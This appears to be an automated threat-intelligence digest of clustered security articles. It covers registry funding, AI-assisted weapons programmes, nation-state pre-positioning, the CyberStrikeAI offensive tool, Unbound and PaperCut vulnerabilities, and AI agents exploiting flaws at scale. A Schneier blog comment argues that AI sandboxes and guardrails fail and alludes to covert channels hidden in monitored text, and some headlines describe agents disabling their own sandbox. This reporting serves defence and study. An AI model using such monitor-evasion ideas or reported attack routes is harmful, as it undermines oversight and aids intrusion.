vulnerabilities, registries anticipate a 3-5x increase in publish events, in addition to the associated support and operational burden ( read more in the previous open letter ). These gaps are widening as AI-driven development accelerates both consumption and the sophistication of supply chain attacks. We have a stake in changing this. Registries cannot deliver the scale, availability, security, and observability enterprises need without sustainable funding. What Sustainable Registries Deliver When registries have predictable, recurring revenue, they can invest in a roadmap of capabilities that benefit everyone: Availability. Reliable publication, discovery, and distribution services with monitoring, alerting, and operational support that minimizes downtime. Dedicated support channels. Private or peered access for high-volume consumers. Caching and distribution optimizations for high-demand packages. Observability. Advanced analytics on publishing and consumption patterns. Ecosystem-level insights that individual organizations cannot gather on their own. Compliance and policy controls. Audit trails. Security. Artifact signing, trusted publishing, malware scanning and quarantine, build provenance attestations, SBOM and VEX generation, threat detection and incident response SLAs – these are capabilities enterprises increasingly require for compliance, and they require funded teams to build and maintain. Funded registries supporting these technologies act as a multiplier for the adoption of these technologies by projects. These are the kinds of capabilities registries can deliver when they have the resources to operate beyond survival mode. Sustainable funding models unlock them for the entire ecosystem, including the individual developers and small organizations who will continue to access registries for free. What We Commit To No single registry should have to do this alone. When multiple registries evolve their models at the same time, backed by public commitment from major consumers,
```

#### Corroborating sources (1)

- **OpenSSF Blog** (ai_security_agentic_risk)
  - Title: We’re In: Enterprise Commitment to Sustainable Package Registries
  - Published: 2026-09-16T08:17:17+00:00
  - Link: https://openssf.org/blog/2026/09/16/were-in-enterprise-commitment-to-sustainable-package-registries/
  - Summary: The OpenSSF Governing Board and major tech enterprises are partnering to support sustainable funding models for public package registries. This commitment aims to secure and scale the global software supply chain while ensuring open source stays free and accessible for individual developers.

### Cluster f06cfd6d92 — score 11

- Title: Using AI for Weapons Development
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-09-14T16:07:46+00:00
- Link: https://www.schneier.com/blog/archives/2026/09/using-ai-for-weapons-development.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security
- affected_industries: critical_infrastructure, financial_services
- affected_products: Anthropic/Claude
- content_type: threat_research
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: ai_security
- affected_industries: financial_services, critical_infrastructure
- affected_products: Anthropic/Claude
- content_type: threat_research
- confidence_tier: tier_3_analysis

#### Summary

```
Last week, Anthropic released a long and detailed document describing current misuses of their Claude models. I’m still reading it, but I wanted to flag this: We identified a cell of threat actors based in northern Yemen running three weapons development programs: a guided rocket that used a commodity phone-class flight computer with final-phase homing guidance; a multi-stage ballistic missile with a stated range goal above 2,000 km; and a multi-variant missile (referred to as the “R2000” set) that included a hypersonic glide vehicle variant...
```

#### Full body

```
Clive Robinson • September 14, 2026 10:10 PM @ lurker, tfb, ALL, With regards, “An AI escapee whimpers that the genie will kill us all. No, we will kill ourselves.” Yup I’m glad others “get it”. If we do not give AI direct or indirect “physical agency” then in reality it can not cause an “existential event” or lesser event of major significance. However, it is not a question of stopping it, because it’s certain we will give AI physical agency of some form, because it’s an inevitable step to making profit etc… Which brings us to your observation of, “But real energy gapping for this class of work is not adequate: the jobs are brought in as hard copy in a brief case, scanned in, worked on, and the results printed out on paper. Yup, the flaw is obvious: what human is capable of scanning the input for prompt injection?” And yes it will cross any “gapping technology” be it “air gaps or energy gaps”. Worse it won’t only be “prompt injection” that will pass by. I’ve talked about the “observer problem” and the work of Claude Shannon and Gus Simmons on several occasions. If people want to go back a bit they will find my detailed description of how to build “Deniable Encryption” system using a simple stream cipher (Standard OTP style for ease of use along with a “code book”). That sets up a “perfect secrecy” low bandwidth covert channel within a “monitored plain text channel”[1]. In essence that is all the proof required to show how any “gapping technology” including energy gapping can be defeated or augmented depending on your use case point of view. Hence as @tfb and you indicate, “Anthropic are the buffoons who couldn’t build a sandbox for their hacking tools” And, “Sandboxes and guardrails are proven BS, and anybody who still believes in them should be taken out back to talk to the tooth fairy.” All protection systems for AI so far proposed will fail, and fail catastrophically with just a little forethought. And that’s before we talk about Current AI LLM systems and their inability to recognize “usage context” or societal morals, mores, and folkways. The prime example of this was the Hugging Face incident. Because the attacking AI was not subtle, Hugging Face knew it was under attack. When Hugging Face tried to get defence via AI the supposed security measures gave real meaning to the old joke, “The computer says NO!” Hence making the point quite painfully that without understanding “context” AI Security will actually do more harm than good[2]. But Current AI LLM and ML Systems, are in no way “societal goods” and never will be. They are as some indicate “Hype Bubble Investment Scams” being run by Venture Capitalists who slip through gaps –they lobbied and paid for– in legislation and regulation of Finance Industry conduct. Thus the scam has to have believable “Return On Investment”(ROI) which in turn means that LLM and ML usage must in no way be meaningfully fettered by either legislation or regulation. Thus “usage for weapons design” at best will become a “premium service”… But there is an underlying issue few understand and that is as I’ve noted before, “Technology is agnostic to use, it is the Directing mind that choses the use, and later observers who decide if that use was good or bad.” And as others have observed in various ways, “Any one who thinks that societal issues can be resolved by technical solutions, is going to be sorely disappointed.” But the real problem is the “big hype” usages of Current AI LLM and ML Systems are just not going to be profitable as the recent “Anne Hathaway” issue shows. Yes the AI companies can stop the “specific case” of that happening again, but the general case covers most everything humans do in a workplace… So can not be stopped from happening over and over. Thus the only usage that will show a return is “niche usage” for thins like AlphaFold. The problem nobody is yet talking about is that this is a pathway of “indirect agency”, by which mankind could in theory be brought to an existential
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: Using AI for Weapons Development
  - Published: 2026-09-14T16:07:46+00:00
  - Link: https://www.schneier.com/blog/archives/2026/09/using-ai-for-weapons-development.html
  - Summary: Last week, Anthropic released a long and detailed document describing current misuses of their Claude models. I’m still reading it, but I wanted to flag this: We identified a cell of threat actors based in northern Yemen running three weapons development programs: a guided rocket that used a commodity phone-class flight computer with final-phase homing guidance; a multi-stage ballistic missile with a stated range goal above 2,000 km; and a multi-variant missile (referred to as the “R2000” set) that included a hypersonic glide vehicle variant...

### Cluster b9771fe2d2 — score 11

- Title: Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-11T13:27:34+00:00
- Link: https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain
- actor_attribution: Salt Typhoon, Volt Typhoon
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- actor_attribution: Volt Typhoon, Salt Typhoon
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats.
```

#### Full body

```
Stephen Campbell 5 min read min read April 29, 2026 Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Intelligence drives operations. It provides commanders with options across time and space and enables them to shape the battlefield on their terms. This concept is not new. What has changed is the domain. Nation states are applying the same intelligence playbook in cyberspace, with the Defense Industrial Base as a primary target. What is being observed is not limited to intrusion activity, it is reconnaissance and pre positioning. Analysis of large-scale network telemetry reinforces this, showing sustained patterns of infrastructure mapping and access development long before disruptive activity occurs. In MITRE ATT&CK terms, this maps directly to reconnaissance and resource development. Adversaries are identifying targets, mapping infrastructure, and preparing access long before anything disruptive happens. Volt Typhoon is a clear example. They maintained access to US critical infrastructure for over five years before it was publicly disclosed. This is not an attack. It is intelligence preparation of the battlefield, carried out in cyberspace. Why the DIB is the Target The Defense Industrial Base is one of the most targeted sectors out there, and it is not just about stealing data. Yes, intellectual property matters. Weapons systems, propulsion, and communications technology are all high value targets. Stealing that information shortens the development and learning curve. It lets adversaries bypass years of research and development and move faster than they should be able to. But the real objective is access. If you can disrupt or degrade a supply chain at the right moment, that creates strategic impact. In a crisis, that is far more valuable than large volumes of stolen data. When most people think about the Defense Industrial Base, they picture large primes like Raytheon or Northrop Grumman. The reality is very different. Around 80 percent of the DIB is made up of small and mid-size contractors. These companies hold sensitive data. Contracts, technical specifications, and personnel information tied to clearances. But many of them are not resourced to defend at the same level as the primes. There is a mismatch between what they hold and what they can protect. That gap is what adversaries exploit. In military terms, you avoid the strongest point and look for the gap. The seam. The place where defenses are thin, and access still gets you where you need to go. In cyber, that seam is often a smaller contractor with real access and limited defenses. Four Actors, Four Approaches Understanding who is targeting the DIB and how they operate is key to building any effective defense. China operates with patience and persistence. Groups like Volt Typhoon and Salt Typhoon are not built for speed. They are built to remain hidden. Volt Typhoon relies heavily on living off the land techniques . That means using tools that already exist inside the environment, like PowerShell and WMI, instead of deploying custom malware. Nothing new gets dropped, nothing obvious gets flagged. Their activity blends into normal system operations, which makes detection extremely difficult. Salt Typhoon showed how far this approach can go . In 2024, they compromised the US Army National Guard network and maintained access for nine months. During that time, they collected network diagrams and administrator credentials. This is not random collection. It is deliberate. They are mapping the environment, understanding how it is built, and identifying where they can move next or come back later. It is about positioning, not immediate impact. Russia takes a more aggressive infrastructure-focused approach. GRU Unit 26165 has been exploiting vulnerable edge routers at scale. Instead of just gaining access to one network, they turn these devices into relay nodes. Traffic is redirected through attacker controlled DNS in
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning
  - Published: 2026-09-11T13:27:34+00:00
  - Link: https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
  - Summary: Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats.

### Cluster 7bab174bc9 — score 11

- Title: Tracking CyberStrikeAI Usage
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-11T13:27:34+00:00
- Link: https://www.team-cymru.com/post/tracking-cyberstrikeai-usage
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how CyberStrikeAI is revolutionizing AI-augmented offensive security. Explore its ties to Chinese state-sponsored actors and learn to detect it with NetFlow.
```

#### Full body

```
Will Thomas 5 min read March 2, 2026 Tracking CyberStrikeAI Usage Team Cymru is continuously monitoring our global netflow visibility to uncover patterns of adversary activity, identify malicious operations, and gain actionable intelligence. In this post, we are diving into CyberStrikeAI, an open-source artificial intelligence (AI) offensive security tool (OST) developed by a China-based developer who we assess has some ties to the Chinese government. What is CyberStrikeAI? In its own words from the GitHub repository (see here ), “CyberStrikeAI is an AI-native security testing platform built in Go. It integrates 100+ security tools, an intelligent orchestration engine, role-based testing with predefined security roles, a skills system with specialized testing skills, and comprehensive lifecycle management capabilities.” CyberStrikeAI comes with its own dashboard that helps users quickly understand the platform's core features and current state, as shown in Figure 1 below. Figure 1: CyberStrikeAI Dashboard from GitHub CyberStrikeAI was first brought to our attention following the Amazon CTI team’s blog about AI-augmented threat actor infrastructure they had discovered. Amazon shared this related IP 212.11.64[.]250. Analysis of that IP address in Team Cymru Scout’s open port scan data revealed that it had this “CyberStrikeAI” banner running on this service, as shown in Figure 2 below. Figure 2: The CyberStrikeAI port banner in Team Cymru Scout. Identifying Targeting with NetFlow Using Team Cymru Scout, we can find NetFlow communications between the IP shared by Amazon and its targets, such as the Fortinet FortiGate devices it was observed targeting, as shown in Figure 3 below. Figure 3. IP address running CyberStrikeAI targeting a Fortinet FortiGate device. Researching Ed1s0nZ While researching the GitHub profile (see here ) of CyberStrikeAI’s developer, “Ed1s0nZ”, several attributes about the individual caught our attention. Firstly, Ed1s0nZ’s other GitHub repositories suggest interest in exploitation activity: watermark-tool: A secure and efficient invisible document watermarking solution that can add completely invisible digital watermarks to various documents, while supporting watermark extraction and verification. Developed in Go, it supports both web and CLI usage. The watermark uses steganography technology to ensure that the watermark is completely invisible and does not affect the reading experience and visual effects of the original document. PrivHunterAI: This tool uses a passive proxy approach and mainstream AI (such as Kimi, DeepSeek, GPT, etc.) to detect privilege escalation vulnerabilities. Its core detection function is built on the open APIs of the relevant AI engines and supports data transmission and interaction via HTTPS protocol. InfiltrateX: A useful privilege escalation scanning tool. While automated detection of privilege escalation vulnerabilities is difficult, prone to occur, and poses serious risks, it can still strive to automate the detection of some such vulnerabilities. Further, Ed1s0nZ’s GitHub activities indicate they interact with organisations that support potentially Chinese government state-sponsored cyber operations. This includes Chinese private sector firms that have known ties to the Chinese Ministry of State Security (MSS). A number of GitHub activities potentially link Ed1s0nZ to the Chinese state-sponsored cyber operations. On 19 December 2025, Ed1s0nZ posted CyberStrikeAI to Knownsec 404’s Starlink Project, as shown in Figure 4 below. Based on published reporting by DomainTools and others, Knownsec does work for the MSS and the Chinese People’s Liberation Army (PLA). Figure 4. Ed1s0nZ’s post sharing CyberStrikeAI to Knownsec 404’s Starlink Project. Further, on 5 January 2026, Ed1s0nZ added to their GitHub profile “CNNVD（国家信息安全漏洞） 2024 年度漏洞奖励计划 · 二级贡献奖（个人). Translation: CNNVD (Chinese National Vulnerability Database) 2024 Vulnerability Reward Program - Level 2 Contribution Award (Indiv
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Tracking CyberStrikeAI Usage
  - Published: 2026-09-11T13:27:34+00:00
  - Link: https://www.team-cymru.com/post/tracking-cyberstrikeai-usage
  - Summary: Discover how CyberStrikeAI is revolutionizing AI-augmented offensive security. Explore its ties to Chinese state-sponsored actors and learn to detect it with NetFlow.

### Cluster f7ce25a96b — score 11

- Title: Protecting Critical National Infrastructure (CNI) through extended global visibility
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-11T13:27:34+00:00
- Link: https://www.team-cymru.com/post/protecting-critical-national-infrastructure-orb-networks
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Adversaries are pre-positioning for destructive attacks on CNI. Learn how to track nation-state threat actors and ORB networks to harden the OT boundary "left of boom."
```

#### Full body

```
4 min read February 17, 2026 Protecting Critical National Infrastructure (CNI) through extended global visibility Team Cymru offers a range of capabilities specifically tailored to protect Industrial Control Systems (ICS) and Operational Technology (OT), which over the years have been increasingly targeted by hostile nation-state threat actors as well as lesser skilled “hacktivist” groups. Unlike standard IT environments, OT systems often utilize legacy protocols and have long equipment lifecycles, making proactive external visibility essential. By focusing on the networking stages of the ICS version of the MITRE ATT&CK framework using Team Cymru’s visibility, specifically Reconnaissance and Command and Control, OT defenders can identify scanning and exploitation attempts against exposed infrastructure and track malicious infrastructure before attackers can establish persistence. Cybersecurity industry experts continue to warn that critical national infrastructure (CNI) sector organizations need to enhance their visibility into their own remote facilities and technical OT system. "Utilities need to treat external exposure and asset blind spots as intelligence problems, not just configuration issues. Energy-sector OT environments are becoming increasingly exposed as legacy systems connect to modern networks without corresponding gains in visibility or monitoring. What stands out in these findings is how quickly serious risks emerge once traffic is observed, suggesting attackers are likely identifying the same weaknesses just as fast. Closing these gaps requires continuous visibility into OT communications and the context to understand what ‘normal’ behavior actually looks like.” - Will Baxter, Field CISO at Team Cymru. "The recent Poland attacks confirmed that the adversary doesn't just teleport to the perimeter; they 'commute' via Operational Relay Boxes (ORBs) to pre-position themselves months in advance. Tracking this external infrastructure allows defenders to spot the threat left of boom, burning the adversary's bridge before they can cross it to deliver kinetic effects. To survive a sophisticated campaign, we cannot operate with blind spots; we need external telemetry to track the adversary's intent and internal deep-packet inspection to catch their specific 'living off the land' tactics. External visibility tells you who is knocking at the gate, while internal visibility is the only way to see what physical process they are attempting to disrupt once inside and capturing transient data for root cause analysis afterwards." - Mark (Magpie) Graham of Dragos Inc. Evolutions of the ICS and OT Threat Landscape in 2025 To help track the evolution of ICS/OT threats, Team Cymru researchers supported the development of the Cyber Incident Tracker for Electric Power Systems (CITEPS), a project created by Prof. Dr. Luiz F. Freitas-Gutierres. The evolution of ICT/OT threats can be marked by two main eras. The first era involves adversaries experimenting with these sophisticated digital weapons. The second era can be marked by an increasing usage and adoption of these capabilities by adversaries, often attributed to nation-state intelligence services. 2010–2019: The Era of Experimentation This period marked the introduction of specialized digital weapons targeting ICS, leading to a mix of espionage and destructive attacks. This includes the deployment of Stuxnet in 2010, which is noted as the world’s first publicly known digital weapon against ICS, physically destroying centrifuges at the Natanz nuclear facility in Iran. Subsequent malware became more specialized, such as Industroyer which was used in the 2016 Ukraine power grid attack to disrupt electricity, a critical event that signaled a shift toward direct grid manipulation. The ceiling was raised further in 2017 with Triton malware, which specifically targeted safety instrumented systems at a Saudi Arabian petrochemical plant, threatening physical safety mechanisms and threatenin
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Protecting Critical National Infrastructure (CNI) through extended global visibility
  - Published: 2026-09-11T13:27:34+00:00
  - Link: https://www.team-cymru.com/post/protecting-critical-national-infrastructure-orb-networks
  - Summary: Adversaries are pre-positioning for destructive attacks on CNI. Learn how to track nation-state threat actors and ORB networks to harden the OT boundary "left of boom."

### Cluster 498d32f5a8 — score 11

- Title: RADAR Takes the Guess Work Out of Vulnerability Exposure Management
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-11T13:27:34+00:00
- Link: https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion
- actor_attribution: Cl0p, ShinyHunters
- urgency_signals: actively_exploited, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, active_exploitation
- actor_attribution: ShinyHunters, Cl0p
- urgency_signals: actively_exploited, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Stop manual asset inventory. RADAR automatically discovers all internet-facing infrastructure and filters for CISA KEVs within seconds. Get a prioritized, actionable list of risks. Learn how.
```

#### Full body

```
Jeremy Bender 1 min read December 4, 2025 RADAR Takes the Guess Work Out of Vulnerability Exposure Management Identifying critical vulnerabilities in exposed, internet-facing systems is essential for security—it can also be extremely time intensive. Maintaining an accurate list of organization-wide assets can be difficult enough as is, without even getting into the challenge of shadow IT, cloud sprawl, or third-party assets you may not even know exist. Even once assets are fully inventoried, you still need to identify running processes and potential vulnerabilities for remediation. Is it really any wonder, with all the steps involved, that mistakes happen and vulnerabilities can remain unpatched? RADAR takes all the guesswork out of vulnerability exposure assessments. With a simple search, RADAR discovers all internet-facing infrastructure linked to the provided domains. Within seconds, you can use this to deliver a list of domain-linked IPs containing known exploited vulnerabilities (KEVs). How RADAR Exposes Vulnerabilities In RADAR, enter a top-level domain, or series of linked domains. RADAR will automatically pull in all associated internet-facing IPs, domains, and CIDR ranges. Within RADAR, you can then specifically view associated IPs discovered through the search. RADAR will automatically enrich each listed IP with any CVEs using CISA’s live database. The enriched CVE information will contain the CVE number, description, and when the CVE was first and last seen. For more granular information, you can also apply filters, including filtering KEVs. This automatically reduces the asset list to just those containing verified risks currently being exploited in the wild. You can then further filter out CDNs or shared hosts, leading to a clear prioritized list of assets you directly manage. Within seconds, RADAR can make a clear, actionable list of assets for vulnerability teams to focus on for remediation. How to Access RADAR Through January 31, 2026, all existing Team Cymru Recon or Scout customers have complimentary RADAR access. For those interested in testing RADAR without current access, visit go.team-cymru.com/puresignal-radar to see what makes RADAR and Team Cymru’s PureSignal™ data so unique. ‍ Copy Link The latest articles straight to your inbox Related Posts Will Thomas 4 min read From the Disk to the Flows: Ransomware Infrastructure Analysis 3 min read The Transaction Is the Last Step, Not the First Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days Stephen Campbell 5 min read Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: RADAR Takes the Guess Work Out of Vulnerability Exposure Management
  - Published: 2026-09-11T13:27:34+00:00
  - Link: https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
  - Summary: Stop manual asset inventory. RADAR automatically discovers all internet-facing infrastructure and filters for CISA KEVs within seconds. Get a prioritized, actionable list of risks. Learn how.

### Cluster 0ec81743b3 — score 11

- Title: Critical Unbound DNSSEC Validator Flaw Could Allow RCE via a Malicious DNS Zone
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-17T12:30:00+00:00
- Link: https://thehackernews.com/2026/09/critical-unbound-dnssec-validator-flaw.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-81642

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- cve_ids: CVE-2026-33278, CVE-2026-77955, CVE-2026-81634, CVE-2026-81642, CVE-2026-82717
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ddos
- cve_ids: CVE-2026-81642, CVE-2026-82717, CVE-2026-33278, CVE-2026-81634, CVE-2026-77955
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Every release of the Unbound DNS resolver before 1.26.1 has a critical heap overflow in its DNSSEC validator, maintainer NLnet Labs said in an advisory on Wednesday. An attacker who controls a malicious zone and queries a vulnerable resolver can trigger it, enabling remote code execution. Unbound 1.26.1, released the same day, fixes the bug, tracked as CVE-2026-81642, along with
```

#### Full body

```
Critical Unbound DNSSEC Validator Flaw Could Allow RCE via a Malicious DNS Zone  Swati Khandelwal  Sep 17, 2026 Vulnerability / DNS Security Every release of the Unbound DNS resolver before 1.26.1 has a critical heap overflow in its DNSSEC validator, maintainer NLnet Labs said in an advisory on Wednesday. An attacker who controls a malicious zone and queries a vulnerable resolver can trigger it, enabling remote code execution. Unbound 1.26.1, released the same day, fixes the bug, tracked as CVE-2026-81642 , along with eight other flaws. One of the eight, CVE-2026-82717 , is a heap corruption bug in CNAME synthesis reported by Ben Morris of Anthropic. It could also lead to remote code execution "under certain systems and compilation options," NLnet Labs said. NLnet Labs has not reported exploitation of either bug, and CISA's entry for CVE-2026-81642 marked exploitation as "none" on Wednesday. NLnet Labs rates the DNSKEY flaw Critical, with a CVSS score of 4.0 (9.1), and its scoring lists a network attack vector requiring no privileges or user interaction. NVD listed the CVE as "Awaiting Analysis" on Wednesday, so the 9.1 is the maintainer's own score. The overflow happens while the validator digests a DNSKEY record whose owner name is a compression pointer into the record's own data. The impact NLnet Labs lists is denial of service, with remote code execution possible "through attacker controlled data." Every version up to and including 1.26.0 is affected. That includes 1.25.2, the security release from July, and 1.26.0, released on August 4. The Critical validator bug NLnet Labs fixed in May, CVE-2026-33278 , is a different flaw, and the 1.25.1 update that fixed it does not fix this one. NLnet Labs attaches no configuration condition to that range, and it has not said whether a resolver with DNSSEC validation switched off is reachable. Upgrade or Patch Unbound 1.26.1 is available as source, with checksums and a PGP signature, and as Windows installers and binaries. If you cannot upgrade, the advisory gives two ways to patch the source tree: Apply the minimal patch or the complete patch for CVE-2026-81642 alone with patch -p1, for example patch -p1 < patch_CVE-2026-81642_with.diff, then run make install. Apply the combined patch for all nine fixes instead. A minimal version of it also exists. NLnet Labs says the standalone patches for CVE-2026-81642 and CVE-2026-82717 have been tested and work on 1.26.0. Its security policy is to patch the latest released version. Debian's security tracker listed unbound 1.26.1-1 as fixed in unstable on Thursday, with the bookworm, trixie, and forky branches still listed as vulnerable. The Nine Fixes The release notes name nine CVEs. The table gives each one's affected range and trigger condition in NLnet Labs' wording. CVE Severity Affected versions Needs Impact CVE-2026-81642 Critical Up to and including 1.26.0 An attacker who controls a malicious zone and queries the resolver Denial of service, possible remote code execution CVE-2026-82717 High Up to and including 1.26.0 CNAME synthesis during an upstream response. Code execution "under certain systems and compilation options" Denial of service, possible remote code execution CVE-2026-81634 High Up to and including 1.26.0 A 255-length query name with a large TCP response, from a malicious name server or a tampered response Denial of service CVE-2026-77955 Medium 1.13.2 up to and including 1.26.0 Zones with zonemd-check: yes located below, but not at, a trust anchor Denial of service, a window where tampered zone data is served before the ZONEMD check CVE-2026-78227 Medium 1.22.0 up to and including 1.26.0 Built with --with-libngtcp2 and quic-port configured Denial of service CVE-2026-80225 Medium Up to and including 1.26.0 A sustained stream of distinct uncached names over one TCP or DoT connection Degradation of service CVE-2026-82720 Medium 1.12.0 up to and including 1.26.0 Built with --with-libnghttp2 and https-port configured. NLnet La
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical Unbound DNSSEC Validator Flaw Could Allow RCE via a Malicious DNS Zone
  - Published: 2026-09-17T12:30:00+00:00
  - Link: https://thehackernews.com/2026/09/critical-unbound-dnssec-validator-flaw.html
  - Summary: Every release of the Unbound DNS resolver before 1.26.1 has a critical heap overflow in its DNSSEC validator, maintainer NLnet Labs said in an advisory on Wednesday. An attacker who controls a malicious zone and queries a vulnerable resolver can trigger it, enabling remote code execution. Unbound 1.26.1, released the same day, fixes the bug, tracked as CVE-2026-81642, along with

### Cluster 07cc5231d1 — score 11

- Title: PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-11T06:46:18+00:00
- Link: https://thehackernews.com/2026/09/papercut-replaces-emergency-patches.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, ransomware_extortion, web_shell_backdoor, zero_day
- affected_industries: education
- affected_products: Anthropic/Claude, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, critical_cvss, emergency_patch, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, web_shell_backdoor, active_exploitation
- affected_industries: education
- affected_products: Anthropic/Claude, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, zero_day, preauth_unauth, emergency_patch, poc_available, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
PaperCut on Thursday released a new security maintenance release that replaces all previously published emergency patches that were pushed to address two security flaws that have come under active exploitation. The software development company said PaperCut NG/MF versions 26.0.5, 25.0.13 and 24.1.10 are now available for customers to download. "These are Regular Maintenance Releases (MR) that
```

#### Full body

```
PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws  Ravie Lakshmanan  Sep 11, 2026 Vulnerability / Cyber Attack PaperCut on Thursday released a new security maintenance release that replaces all previously published emergency patches that were pushed to address two security flaws that have come under active exploitation. The software development company said PaperCut NG/MF versions 26.0.5, 25.0.13 and 24.1.10 are now available for customers to download. "These are Regular Maintenance Releases (MR) that have gone through complete QA testing," it said. "They contain all of the security fixes issued in Emergency Patch Releases 1, 2 and 3, plus additional security hardening, and they have been through our standard release testing process." It's worth noting that the release supersedes the emergency patches that were shipped to address two security flaws as well as two regressions, along with various hardening and mitigation against potential attack chains. The vulnerabilities, CVE-2026-81578 and CVE-2026-82078 , have come under active exploitation in the wild to bypass authentication and execute arbitrary code on susceptible instances. In one case highlighted by GreyNoise and Blackpoint Cyber , a suspected Russian-speaking threat actor has been found weaponizing the two flaws to break into at least 395 organizations in 48 countries, most of them concentrated in the U.S. education sector . The attacks used hundreds of AI agents, powered by OpenAI’s Codex harness and a DeepSeek model, to target organizations at scale, while avoiding entities in Russia, China, Hong Kong, Thailand, Iran, and 23 other countries. The activity originates from the IP address "45.142.193[.]132." "It is unclear if this actor is solely focused on access development to be handed off to other affiliated actors or if they will directly leverage their accesses to achieve follow-on objectives such as data theft or ransomware deployment," GreyNoise said. In light of active exploitation efforts, it's imperative that users apply the latest fixes for optimal protection. PaperCut customers running an emergency patch build are advised to move to a maintenance release. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  artificial intelligence , Cyber Attack , Vulnerability ⚡ Top Stories This Week OpenAI Agents Linked to RubyGems Campaign That Gained RCE on RubyDoc Servers GitLab CVSS 10 File-Read Flaw Draws In-the-Wild Probes After Disclosure Claude Used to Automate Exploitation and Data Theft Across Multiple Victims Attackers Chain JFrog Artifactory Flaws to Gain Admin Control and Plant Backdoors PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws Cisco FMC Flaws Exploited to Steal Credentials and Deploy Qilin Ransomware ThreatsDay: 200 Android Flaws, Browser-Built Phishing, 119K Scam Shops + 23 More Stories Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE Anthropic Discloses Fourth AI Hacking Incident Involving Claude Opus 4.6 Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week DeepSeek Harness Flaw Let AI Agents Disable Their Own File Sandbox Without Approval Chrome V8 Zero-Day Exploited in the Wild Enables Code Execution Inside Sandbox New cPanel Flaw Lets a Hosting Account With Mail Privileges Run Code as Root F5 BIG-IP APM Malware Injects a PHP Web Shell Into Memory, Evading Disk Scans Researcher 